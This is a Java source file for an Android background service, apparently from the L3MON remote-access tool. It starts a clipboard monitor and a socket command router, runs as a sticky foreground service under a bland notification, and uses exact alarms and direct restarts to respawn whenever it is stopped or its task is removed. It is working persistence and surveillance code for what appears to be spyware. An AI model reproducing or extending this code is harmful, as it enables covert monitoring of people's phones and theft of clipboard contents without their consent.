package com.etechd.l3mon.service;

import android.app.AlarmManager;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.IBinder;
import android.os.SystemClock;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import com.etechd.l3mon.R;
import com.etechd.l3mon.core.network.SocketCommandRouter;
import com.etechd.l3mon.features.clipboard.ClipboardMonitor;
import com.etechd.l3mon.receiver.ServiceRestartReceiver;
import com.etechd.l3mon.ui.MainActivity;

public class MainService extends Service {

    private static final String CHANNEL_ID = "MainServiceChannel";
    private static final String ACTION_RESPAWN_SERVICE = "respawnService";
    private ClipboardMonitor clipboardMonitor;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();

        createNotificationChannel();
        startForegroundServiceNotification();
        ensureAppIconVisible();
        clipboardMonitor = ClipboardMonitor.getInstance(this);
        clipboardMonitor.start();
        SocketCommandRouter.initialize();
    }

    private void startForegroundServiceNotification() {
        try {
            NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                    .setContentTitle("Service Running")
                    .setContentText("Background service active")
                    .setSmallIcon(R.mipmap.ic_launcher)
                    .setOngoing(true);
            startForeground(1, builder.build());
        } catch (Exception e) {
            Log.e("MainService", "Foreground service start failed", e);
        }
    }

    private void ensureAppIconVisible() {
        try {
            ComponentName componentName = new ComponentName(this, MainActivity.class);
            PackageManager packageManager = getPackageManager();
            int currentState = packageManager.getComponentEnabledSetting(componentName);
            if (currentState != PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
                packageManager.setComponentEnabledSetting(
                        componentName,
                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        PackageManager.DONT_KILL_APP
                );
            }
        } catch (Exception e) {
            Log.e("MainService", "Failed to ensure app icon visible", e);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                NotificationChannel channel = new NotificationChannel(
                        CHANNEL_ID,
                        "Main Service Channel",
                        NotificationManager.IMPORTANCE_LOW
                );
                channel.setDescription("Persistent background service");
                NotificationManager manager = getSystemService(NotificationManager.class);
                if (manager != null) {
                    manager.createNotificationChannel(channel);
                }
            } catch (Exception e) {
                Log.e("MainService", "Notification channel creation failed", e);
            }
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        scheduleServiceRestart();
        rescheduleForegroundService();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (clipboardMonitor != null) {
            clipboardMonitor.stop();
        }

        scheduleServiceRestart();
        rescheduleForegroundService();
    }

    private void rescheduleForegroundService() {
        try {
            Intent serviceIntent = new Intent(getApplicationContext(), MainService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ContextCompat.startForegroundService(getApplicationContext(), serviceIntent);
            } else {
                getApplicationContext().startService(serviceIntent);
            }
        } catch (Exception e) {
            Log.e("MainService", "Failed to reschedule foreground service", e);
        }
    }

    private void scheduleServiceRestart() {
        try {
            Intent broadcastIntent = new Intent(getApplicationContext(), ServiceRestartReceiver.class);
            broadcastIntent.setAction(ACTION_RESPAWN_SERVICE);
            broadcastIntent.setPackage(getPackageName());

        int pendingIntentFlags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        pendingIntentFlags |= PendingIntent.FLAG_IMMUTABLE;
        }

        PendingIntent restartPendingIntent = PendingIntent.getBroadcast(
            getApplicationContext(),
            0,
            broadcastIntent,
            pendingIntentFlags
        );

            AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            if (alarmManager != null) {
                long triggerAt = SystemClock.elapsedRealtime() + 2000L;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    alarmManager.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, restartPendingIntent);
                } else {
                    alarmManager.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, restartPendingIntent);
                }
            }
        } catch (Exception e) {
            Log.e("MainService", "Failed to schedule service restart", e);
        }
    }
}
